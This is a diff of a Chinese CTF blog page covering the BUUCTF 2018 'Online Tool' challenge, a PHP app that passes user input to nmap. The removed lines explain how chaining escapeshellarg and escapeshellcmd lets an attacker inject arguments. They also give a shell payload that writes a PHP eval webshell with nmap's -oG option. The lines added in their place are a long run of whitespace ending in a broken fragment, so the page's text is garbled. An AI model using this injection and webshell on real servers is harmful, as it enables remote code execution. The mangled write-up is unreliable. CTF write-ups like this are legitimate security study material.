@@ -510,40 +510,7 @@ for i in range(0,24):
 <p>学习一下利用多线程和正则读文件，但是25线程也跑了半小时</p>
 <h2 id="RCE-remote-code-execution"><a href="#RCE-remote-code-execution" class="headerlink" title="RCE(remote code execution)"></a>RCE(remote code execution)</h2><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>题目源码如下</p>
 <pre><code class="php">&lt;?php
-if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
-    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-}
-
-if(!isset($_GET[&#39;host&#39;])) {
-    highlight_file(__FILE__);
-} else {
-    $host = $_GET[&#39;host&#39;];
-    $host = escapeshellarg($host);
-    $host = escapeshellcmd($host);
-    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);
-    echo &#39;you are in sandbox &#39;.$sandbox;
-    @mkdir($sandbox);
-    chdir($sandbox);
-    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
-}</code></pre>
-<p>这个题目的点很简单，就在<code>escapeshellarg</code>和<code>escapeshellcmd</code>这两个函数的这个顺序的连用上出了问题，先总结一下两个函数的作用：</p>
-<p><img src="https://i.loli.net/2020/08/13/8QPnJIq2rTExeFD.png" alt="img"></p>
-<p><img src="https://i.loli.net/2020/08/13/m3U7XFfCv6Di1ja.png" alt="1564053418402"></p>
-<p>由于第一个函数是转义单引号，方式是先用<code>\</code>把单引号转义了，再用一对单引号把它包起来，效果如下：</p>
-<pre><code class="php">php &gt; echo escapeshellarg(&quot;asda&#39;asdas&quot;);
-&#39;asda&#39;\&#39;&#39;asdas&#39;</code></pre>
-<p>两个连用则会</p>
-<pre><code class="php">php &gt; echo escapeshellcmd(escapeshellarg(&quot;asda&#39;asdas&quot;));
-&#39;asda&#39;\\&#39;&#39;asdas\&#39;</code></pre>
-<p>第二个会把没有配对的单引号进行转义，但同时也把第一个函数用作转义的<code>\</code>转义了。相当于可以如下这样逃逸出参数来：</p>
-<pre><code class="php">php &gt; echo escapeshellcmd(escapeshellarg(&quot;asda&#39; -o 1.php&quot;));
-&#39;asda&#39;\\&#39;&#39; -o 1.php\&#39;</code></pre>
-<p>而在执行命令的时候比如写入到文件中时是如下这样的( 当时一直想不明白，明明<code>escapeshellcmd</code>之后 写入shell的那部分字符串也会被转义啊，为什么到文件的时候<code>\</code>就不见了，最后才发现我傻逼了/(ㄒoㄒ)/~~ )</p>
-<pre><code class="shell">root@kali:~# echo &#39;asda&#39;\\&#39;&#39; -o 1.php\&#39;
-asda\ -o 1.php&#39;
-
-root@kali:~# echo &#39;&#39;\\&#39;&#39; \&lt;\?php eval\(\$_REQUEST\[&quot;1&quot;\]\)\; \?\&gt; -oG 1.php 1\&#39;
-\ &lt;?php eval($_REQUEST[1]); ?&gt; -oG 1.php 1&#39;</code></pre>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ?&gt; -oG 1.php 1&#39;</code></pre>
 <p>这样则相当于可以通过该命令已有的参数执行一些命令，甚至getshell。</p>
 <p>找了一下类似的命令还有<code>curl、sendmail、weget</code>等，参考链接如下：</p>
 <p>此题目找到了nmap里输出到指定文件的参数有</p>
@@ -818,9 +785,15 @@ public function filter($string) {
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/passagessqli-labs/" target="_self">sqli-labs</a>
+        <a href="/passagesXCTF-CyBRICS/" target="_self">CyBRICS CTF 2020 Writeup</a>
       </div>
     
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/passages%E5%9B%BD%E8%B5%9B/" target="_self">CISCN 2020 Web Writeup</a>
+        <i class="iconfont icon-next"></i>
+      </div>
     
   </nav>
 
